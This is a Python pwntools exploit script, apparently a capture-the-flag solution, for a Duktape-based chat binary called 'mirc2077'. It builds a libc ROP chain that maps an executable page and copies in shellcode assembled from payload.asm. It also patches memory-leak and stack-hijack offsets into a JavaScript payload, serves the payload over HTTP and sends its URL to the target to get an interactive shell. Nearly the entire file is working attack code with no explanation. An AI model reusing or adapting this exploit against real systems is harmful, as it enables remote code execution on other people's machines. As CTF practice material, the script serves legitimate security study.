#! /usr/bin/env python2

from pwn import *
import binascii
import time
import sys
import re
import os

#context(arch = 'i386', os = 'linux', endian='little')
context(arch = 'amd64', os = 'linux', endian='little')
context.terminal = ['rxvt-unicode', '-e', 'sh', '-c']
context.log_level = 'info'
debug_shellcode = False
test_script = False
cmd = ""
target = os.path.abspath("../release/bins/mirc2077")
libc_target = os.path.abspath("../release/bins/libc-2.27.so")
pwn_script = 'pwn64.js'

exploit_url = "http://127.0.0.1:8000/{}".format(pwn_script)
p = None

bin = ELF(target)
libc = ELF(libc_target)

def get_gadget(rop, val):
  log.info(val)
  return hex(rop.find_gadget(val).address + 0x1000000000) + ","

def get_symbol(bin, val):
  return hex(bin.symbols[val] + 0x1000000000) + ","

def set_val(val):
  return hex(val) + ","

def set_val_rebase(val):
  return hex(val+0x1000000000) + ","

# merge separate scripts and replace offsets
def build_rop_chain(sc_len):
  rop = ROP(libc_target)
  rop_chain = "["
  # setup mmap call
  rop_chain += get_gadget(rop, ['pop rdi', 'ret'])
  rop_chain += set_val(0x1000000)
  rop_chain += get_gadget(rop, ['pop rsi', 'ret'])
  rop_chain += set_val(0x1000)
  rop_chain += get_gadget(rop, ['pop rdx', 'ret'])
  rop_chain += set_val(0x7) 
  rop_chain += get_gadget(rop, ['pop rcx', 'ret'])
  rop_chain += set_val(0x22)
  rop_chain += get_symbol(libc, "mmap")
  # memcpy(rwx_page, js_shellcode_buf, 200)
  rop_chain += get_gadget(rop, ['pop rdi', 'ret'])
  rop_chain += set_val(0x1000000)
  rop_chain += get_gadget(rop, ['pop rsi', 'ret'])
  rop_chain += set_val(0xcaf3beef)
  rop_chain += get_gadget(rop, ['pop rdx', 'ret'])
  rop_chain += set_val(sc_len)
  rop_chain += get_symbol(libc, "memcpy")
  # pass shellcode_ctx to rdx -libc base etc
  rop_chain += get_gadget(rop, ['pop rdx', 'ret'])
  rop_chain += set_val(0xac1dbeef)
  # shellcode();
  rop_chain += set_val(0x1000000)
  rop_chain += "0xac1dbab3"
  rop_chain += "]"
  return rop_chain

def build_shellcode():
  sc_target = "./shellcode"
  if os.path.exists(sc_target):
    os.unlink(sc_target)
  os.system('cat payload.asm | kstool x64 | grep -oE "= \[(.*)\]" | sed "s/\[ //g" | sed "s/ \]//g" | xxd -p -r > shellcode')
  pwn = ""
  with open(sc_target) as f:
    pwn = f.read()
  log.info(len(pwn))
  sc_len = len(pwn)
  sc = "["
  if debug_shellcode == True:
    sc += "0xcc,"
  for x in range(len(pwn)):
    sc += "0x{}".format(binascii.hexlify(pwn[x]))
    if x < len(pwn) -1:
      sc += ','
  sc += "]"
  return sc, sc_len
  
def build_exploit():
  if test_script:
    return
  data = ""
  parts = ['exploit/utils.js', 'exploit/64.js', 'exploit/pwnbase.js']

  stack_offset = hex(752)
  god_gadget = hex(0x4f322)
  got_offset = hex(bin.got['free']) # used to leak libc addr later
  performance_now = hex(bin.symbols['duk_bi_performance_now']) # used to calculate elf base later
  stack_target = hex(bin.symbols['duk_eval_raw'] + 110) # <duk_eval_raw+110> mov DWORD PTR [rbp-0x4], eax (good hijack target)
  stack_target_2 = hex(bin.symbols['exec_js_renderer'] + 0x10d) # 0x000055ba54ca81ad <exec_js_renderer+010d>
  libc_offset = hex(libc.symbols['free']) # used to calculate libc base later
  environ = hex(libc.symbols['environ']) # used to leak the stack
  log.info('target.got.free offset: {}'.format(got_offset))
  log.info('performance_now offset: {}'.format(performance_now))
  log.info('libc.free offset: {}'.format(libc_offset))
  log.info('environ offset: {}'.format(environ))
  log.info('stack_target offset: {}'.format(stack_target))

  if os.path.exists(pwn_script):
    os.unlink(pwn_script)
  with open(pwn_script, 'a+b') as f:
    for p in parts:
      with open(p, 'r+b') as e:
        data += e.read()
    sc, sc_len = build_shellcode()
    data = data.replace('_REPLACE_GOT_TARGET_', got_offset)
    data = data.replace('_REPLACE_LIBC_TARGET_', libc_offset)
    data = data.replace('_REPLACE_PERFORMANCE_NOW_TARGET_', performance_now)
    data = data.replace('_REPLACE_ENVIRON_TARGET_', environ)
    data = data.replace('_REPLACE_STACK_TARGET_', stack_target)
    data = data.replace('_REPLACE_STACK2_TARGET_', stack_target_2)
    data = data.replace('_REPLACE_ROPCHAIN_TARGET_', build_rop_chain(sc_len))
    data = data.replace('_REPLACE_SC_LEN_TARGET_', str(sc_len))
    data = data.replace('_REPLACE_SC_TARGET_', sc)
    data = data.replace('_REPLACE_STACK_OFFSET_TARGET_', stack_offset)
    data = data.replace('_REPLACE_GOD_GADGET_TARGET_', god_gadget)
    f.write(data)
  log.info("Exploit built to {}".format(pwn_script))

# make debugging PIE binaries suck less - credits to je / OwariDa
def pie_fix(p, target):
  base_addr = None
  log.info("PIE Binary, fixing symbols for: {}!".format(target))
  for line in open('/proc/%d/maps' % p.pid).readlines():
    arr = line.split()
    if arr[5] == target and arr[1] == 'r-xp':
      log.info("found {}".format(arr[5]))
      base_addr = int(arr[0].split('-')[0], 16)
      break
  text_offs = ELF(target).get_section_by_name('.text').header.sh_addr
  return 'sym\nadd-symbol-file {0} {1}'.format(target, hex(base_addr + text_offs))

if len(sys.argv) <= 1:
  log.info('LOCAL SERVER')
  env = {'LD_PRELOAD' : "{} {}".format(os.path.abspath('libc-2.27.so'), os.path.abspath('libcurl64.so'))}
  p = process(target, env=env)
  if bin.pie:
    cmd = pie_fix(p, target)

  gdb.attach(p, '''
  {}
  set print pretty on
  set follow-fork-mode child
  #b print_attack
  #b duk_bi_function_constructor
  #b duk_bi_function_prototype_apply#
  #b duk_push_buffer_object
  #b free
  continue
  '''.format(cmd))
else:
  log.info('REMOTE SERVER')
  exploit_url = "http://172.20.0.1:8000/pwn64.js"
  p = remote('localhost', 6667)

def send_js():
  p.readuntil('you>')
  p.sendline(exploit_url)

build_exploit()
send_js()
p.interactive()

